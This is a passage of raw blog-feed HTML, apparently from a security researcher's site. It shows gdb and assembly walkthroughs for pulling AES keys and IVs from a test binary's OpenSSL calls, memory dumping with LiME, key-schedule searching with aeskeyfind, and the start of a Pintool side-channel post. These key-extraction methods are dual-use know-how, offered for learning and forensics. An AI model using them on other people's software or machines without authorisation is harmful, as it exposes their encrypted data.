</span><span class="line"><span class="err">0020</span> <span class="err">-</span> <span class="err">70</span> <span class="err">7</span><span class="nf">b</span> <span class="nv">ec</span> <span class="mi">69</span> <span class="mi">89</span> <span class="nv">e1</span> <span class="nv">bc</span> <span class="mi">0</span><span class="nv">a</span><span class="o">-</span><span class="mi">2</span><span class="nv">c</span> <span class="mi">61</span> <span class="nv">f4</span> <span class="nv">c6</span> <span class="mi">26</span> <span class="mi">61</span> <span class="mi">5</span><span class="nv">f</span> <span class="mi">2</span><span class="nv">e</span>   <span class="nv">p</span><span class="err">{</span><span class="nv">.i....</span><span class="p">,</span><span class="nv">a..</span><span class="o">&amp;</span><span class="nv">a_.</span>
</span><span class="line">
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048b0b</span> <span class="nv">in</span> <span class="nv">decrypt</span> <span class="p">()</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sass</span>
</span><span class="line"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">decrypt</span><span class="p">:</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ac8</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebp</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ac9</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048acb</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x38</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ace</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80487e0</span> <span class="o">&lt;</span><span class="nv">EVP_CIPHER_CTX_new@plt</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ad3</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ad6</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ada</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x8048ae1</span> <span class="o">&lt;</span><span class="nv">decrypt</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048adc</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80489ec</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ae1</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80488a0</span> <span class="o">&lt;</span><span class="nv">EVP_aes_256_cbc@plt</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ae6</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048ae9</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="nb">edx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048aed</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048af0</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">edx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048af4</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048afc</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b00</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b03</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b06</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x8048830</span> <span class="o">&lt;</span><span class="nv">EVP_DecryptInit_ex@plt</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x08048b0b</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x1</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b0e</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0x8048b15</span> <span class="o">&lt;</span><span class="nv">decrypt</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b10</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x80489ec</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b15</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b18</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b1c</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b1f</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b23</span> <span class="o">&lt;+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">x08048b26</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Again we see the arguments pushed to the stack.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>EVP_DecryptInit_ex arguments </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="kt">int</span> <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>    <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="p">]</span>
</span><span class="line"><span class="k">const</span> <span class="n">EVP_CIPHER</span> <span class="o">*</span><span class="n">type</span><span class="p">,</span> <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
</span><span class="line"><span class="n">ENGINE</span> <span class="o">*</span><span class="n">impl</span><span class="p">,</span>           <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class="line"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>     <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class="line"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span>       <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line"><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We put a breakpoint at <code>0x08048b06</code> and re-run the binary. Then we can read key and IV like before:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>finding key and IV in gdb without debug info </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span> <span class="p">(</span> <span class="err">$</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x10</span> <span class="p">))</span>
</span><span class="line"><span class="mh">0x8048d71</span><span class="o">:</span>	 <span class="s">&quot;d36a4bf2e6dd9c68&quot;</span>
</span><span class="line"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span> <span class="p">(</span> <span class="err">$</span><span class="n">esp</span><span class="o">+</span><span class="mh">0xc</span> <span class="p">))</span>
</span><span class="line"><span class="mh">0x8048d50</span><span class="o">:</span>	 <span class="s">&quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>However, notice the difference in the function name. It is not just called <code>(0xb7ed3a21) EVP_DecryptInit_ex</code> but <code>(0x08048b06) EVP_DecryptInit_ex@plt</code>. Addresses are different. Here’s a tip which is not scientific or anything but works for me. If you see an address starting with 0×08 you are in process-land and addresses starting with 0xb are in shared library land. But what is this @plt?
In short, it’s the <code>Procedure Linkage Table</code>. The compiler does not know where <code>EVP_DecryptInit_ex</code> points to at runtime so it just puts the function call there (relocation) because it does not know the address of our shared library at runtime. Linker will get this function call and replace it with the correct address for the function (actually this is a lot more complex but PLT and Global Offset Table or GOT need their own article). You can read about GOT/PLT in The <a href="http://www.linuxjournal.com/article/1060">ELF Object File Format by Dissection on Linux Journal</a> (search for “plt” and read 3 paragraphs including the one with lazy binding).</p>

<h4 id="ios-and-android">2.6 iOS and Android</h4>
<p>I am not going to go into detail about how we can monitor crypto function calls in iOS and Android as we already have two excellent tools that accomplish this. <code>[redacted internal tool]</code> is for iOS and <code>[[redacted internal tool]]</code> is for Android. You can make them hook into crypto function calls and find keys. This is left as an exercise to the reader (meaning I am too lazy). There are also two excellent tutorials by two of my co-workers on how to create custom hooks in iOS and Android <a href="https://hexplo.it/substrate-hooking-native-code-iosandroid/">Substrate - hooking C on Android and iOS part1/2</a> and <a href="https://hexplo.it/substrate-android/">Substrate - hooking C on Android and iOS part 2/2</a>.</p>

<h4 id="defence">2.7 Defence?</h4>
<p>We saw that function calls (library calls) leak information. One defense against this side-channel is to link the binaries statically. This will replicate the library code inside the binary and will hopefully make the binary independent of any shared libraries (better for installation). On the other hand, it will increase code size (and thus binary size).</p>

<h3 id="looking-for-key-in-memory">3.0 Looking for Key in Memory</h3>
<p>But there are ways to defeat that too. This is our small incursion into the lands of Digital Forensics. The keys are going to be on memory. So that’s where we are going to look for them. But how do we find keys in memory. One step is to look for data with high entropy because keys usually look random. But there are many 128-bit (or 256) parts of memory that look random so what do we do?</p>

<p>Remember the <code>Key Schedule</code>? It’s the original key, followed by a number of round keys. If we see a 176 byte structure on memory that looks random, that’s probably a key schedule. After finding memories with these characteristics, we can use the relation between the round keys and the original encryption key to determine if the structure is a key schedule.</p>

<p>There are tools that do this for us and they were mostly created for use in Cold Boot Attacks and digital forensics. Imagine if you have a computer running disk encryption software. These keys may be stored in memory in plaintext. Open it up while running until you have access to the RAM. Get a can of air spray, turn it upside down and spray the RAM with it. It will freeze. Frozen RAM degrade much slower so we will have more time to read it. Read it and then run tools on it to find keys. Because memory may have been degraded, these tools use the relationship between round keys and original key to recover degraded bits. For more information you can read this paper <a href="https://citp.princeton.edu/research/memory/">Lest We Remember: Cold Boot Attacks on Encryption Keys</a>.</p>

<h4 id="dumping-memory">3.1 Dumping Memory</h4>
<p>First we need to dump process memory. I know of a couple of different tools. One is <a href="http://lcamtuf.coredump.cx/soft/memfetch.tgz">memfetch</a> by <code>lcamtuf</code> (creator of <a href="http://lcamtuf.coredump.cx/afl/">American fuzzy lop fuzzer</a>). In order to build it in Kali you need some <a href="http://parsiya.net/blog/2014-11-18-building-memfetch-on-kali/">modifications</a>. Another is <a href="https://code.google.com/p/shortstop/">shortstop</a> but has not been update for a long time. By using a <code>Loadable Kernel Module (LKM)</code> named <a href="https://github.com/504ensicsLabs/LiME">LiME</a> we can make a memory snapshot of the entire machine. And last but not least <a href="https://github.com/volatilityfoundation/volatility">Volatility</a> (a memory forensics framework). If you are interested the creators of Volatility recently released a book <a href="http://www.amazon.com/The-Art-Memory-Forensics-Detecting/dp/1118825098">The Art of Memory Forensics</a>. I have not had time to read it but it looks very useful.</p>

<p>Let’s use LiME in our VM.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>building and using LiME </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line">/LiME/src<span class="nv">$ </span>make
</span><span class="line">make -C /lib/modules/3.7-trunk-686-pae/build <span class="nv">M</span><span class="o">=</span>/root/LiME/src modules
</span><span class="line">make<span class="o">[</span>1<span class="o">]</span>: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.7-trunk-686-pae<span class="s1">&#39;</span>
</span><span class="line"><span class="s1">  CC [M]  /root/LiME/src/tcp.o</span>
</span><span class="line"><span class="s1">  CC [M]  /root/LiME/src/disk.o</span>
</span><span class="line"><span class="s1">  CC [M]  /root/LiME/src/main.o</span>
</span><span class="line"><span class="s1">  LD [M]  /root/LiME/src/lime.o</span>
</span><span class="line"><span class="s1">  Building modules, stage 2.</span>
</span><span class="line"><span class="s1">  MODPOST 1 modules</span>
</span><span class="line"><span class="s1">  CC      /root/LiME/src/lime.mod.o</span>
</span><span class="line"><span class="s1">  LD [M]  /root/LiME/src/lime.ko</span>
</span><span class="line"><span class="s1">make[1]: Leaving directory `/usr/src/linux-headers-3.7-trunk-686-pae&#39;</span>
</span><span class="line">strip --strip-unneeded lime.ko
</span><span class="line">mv lime.ko lime-3.7-trunk-686-pae.ko
</span><span class="line">/LiME/src<span class="nv">$ </span>insmod lime-3.7-trunk-686-pae.ko <span class="nv">path</span><span class="o">=</span>memorydump.raw <span class="nv">format</span><span class="o">=</span>raw
</span><span class="line">/LiME/src<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This dumps Virtual Machine’s memory to <code>memorydump.raw</code>. Now we need to find keys.</p>

<h4 id="finding-keys">3.2 Finding Keys</h4>
<p>There are different tools that we can use here again. One is from the “Lest We Remember” paper called <code>aeskeyfind</code>. Another is <a href="http://www.forensicswiki.org/wiki/Bulk_extractor">Bulk extractor</a> which finds other memory artifacts such as URLs, emails and Credit Card numbers. We will use <code>aeskeyfind</code>. The <code>v</code> switch is for verbose mode that prints the key schedule among other information. This is really not recommended in memory forensics because we are running the dump program inside the VM memory and it will alter memory but it is enough for our purposes. Another thing to note is that I was not running our example program while making the memory snapshot but I found encryption keys.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>keys inside VM memory dump </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line">./aeskeyfind -v memorydump.raw
</span><span class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE 376ecc30
</span><span class="line">
</span><span class="line">KEY: 10b57f8070a27e482fd3713da5303108
</span><span class="line">
</span><span class="line">EXTENDED KEY:
</span><span class="line">10b57f8070a27e482fd3713da5303108
</span><span class="line">15724f8665d031ce4a0340f3ef3371fb
</span><span class="line">d4d14059b1017197fb0231641431409f
</span><span class="line">17d89ba3a6d9ea345ddbdb5049ea9bcf
</span><span class="line">98cc11983e15fbac63ce20fc2a24bb33
</span><span class="line">be26d27d803329d1e3fd092dc9d9b21e
</span><span class="line">ab11a0a02b228971c8df805c01063242
</span><span class="line">84328cdcaf1005ad67cf85f166c9b7b3
</span><span class="line">d99be1ef768be442114461b3778dd600
</span><span class="line">9f6d821ae9e66658f8a207eb8f2fd1eb
</span><span class="line">bc536b6955b50d31ad170ada2238db31
</span><span class="line">
</span><span class="line">CONSTRAINTS ON ROWS:
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">00000000000000000000000000000000
</span><span class="line">Keyfind progress: 100%
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The 0 constraints mean that no keys were degraded (because we took an on a VM). <strong>I do not know what the encryption key is, it’s just in memory of VM</strong>. If you find out please let me know. In order to find the key for our OpenSSL program this way, we need to stop execution when the key schedule is on memory. This is left as an exercise to the reader (lol).</p>

<p>This concludes our part one. I initially wanted to write everything in one blog post but it this was already too long. Hopefully I can find a 3rd party app to demonstrate my technique in part 2. As usual if you have any feedback/questions, you know where to find me (side bar —&gt;).</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pin Adventures - Chapter 1 - PinSolver Mk1]]></title>
    <link href="http://parsiya.net/blog/2014-12-08-pin-adventures-chapter-1-pinsolver-mk1/"/>
    <updated>2014-12-08T20:46:59-05:00</updated>
    <id>http://parsiya.net/blog/pin-adventures-chapter-1-pinsolver-mk1</id>
    <content type="html"><![CDATA[<p>While writing the writeups for the <a href="http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/#ch6">Flare On Challenge 6</a> I came upon <a href="http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html">an alternative solution</a> by <a href="https://twitter.com/gaasedelen">@gaasedelen</a> to use the number of executed instructions as a side-channel. Recently during an engagement I used <a href="https://software.intel.com/en-us/articles/pintool">Pintool</a> to do <code>[redacted]</code>. Now that I have a bit of time, I decided to use the idea to write such a tool.</p>

<p>As an example, we will use a C program that checks input for a hardcoded value using <code>strncmp</code>. We want to see if it’s vulnerable to this side-channel (number of executed instructions).</p>

<!-- more -->

<h2 id="my-setup">My Setup</h2>
<p>I will be using a Kali 32-bit VM using VirtualBox. Installing Pin is as simple as extracting the appropriate distribution in a directory and adding it to path.</p>

<h3 id="pintool">Pintool</h3>
<p>Pin is a dynamic binary instrumentation framework by Intel. The default installation contains a good number of examples in <code>/pintool/source/tools/ManualExamples/</code>. If you look at various tutorials on it, most will use instruction count example in <code>inscount0.cpp</code>. I will be simplifying it to suit our needs and do <em>some</em> comments.</p>

<p>Here is the modified code. Let’s name it <code>myins.cpp</code> and save it in the ManualExamples directory. Apologies for the legal stuff at the start but I’d rather keep them than risk the wrath of open source gods.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>myins.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="cm">/*BEGIN_LEGAL </span>
</span><span class="line"><span class="cm">Intel Open Source License </span>
</span><span class="line">
</span><span class="line"><span class="cm">Copyright (c) 2002-2014 Intel Corporation. All rights reserved.</span>
</span><span class="line"><span class="cm"> </span>
</span><span class="line"><span class="cm">Redistribution and use in source and binary forms, with or without</span>
</span><span class="line"><span class="cm">modification, are permitted provided that the following conditions are</span>
</span><span class="line"><span class="cm">met:</span>
</span><span class="line">
</span><span class="line"><span class="cm">Redistributions of source code must retain the above copyright notice,</span>
</span><span class="line"><span class="cm">this list of conditions and the following disclaimer.  Redistributions</span>
</span><span class="line"><span class="cm">in binary form must reproduce the above copyright notice, this list of</span>
</span><span class="line"><span class="cm">conditions and the following disclaimer in the documentation and/or</span>
</span><span class="line"><span class="cm">other materials provided with the distribution.  Neither the name of</span>
</span><span class="line"><span class="cm">the Intel Corporation nor the names of its contributors may be used to</span>
</span><span class="line"><span class="cm">endorse or promote products derived from this software without</span>
</span><span class="line"><span class="cm">specific prior written permission.</span>
</span><span class="line"><span class="cm"> </span>
</span><span class="line"><span class="cm">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS</span>
</span><span class="line"><span class="cm">``AS IS&#39;&#39; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT</span>
</span><span class="line"><span class="cm">LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR</span>
</span><span class="line"><span class="cm">A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE INTEL OR</span>
</span><span class="line"><span class="cm">ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,</span>
</span><span class="line"><span class="cm">SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT</span>
</span><span class="line"><span class="cm">LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,</span>
</span><span class="line"><span class="cm">DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY</span>
</span><span class="line"><span class="cm">THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT</span>
</span><span class="line"><span class="cm">(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span>
</span><span class="line"><span class="cm">OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
</span><span class="line"><span class="cm">END_LEGAL */</span>
</span><span class="line"><span class="cp">#include &lt;iostream&gt;</span>
</span><span class="line"><span class="cp">#include &quot;pin.H&quot;</span>
</span><span class="line">
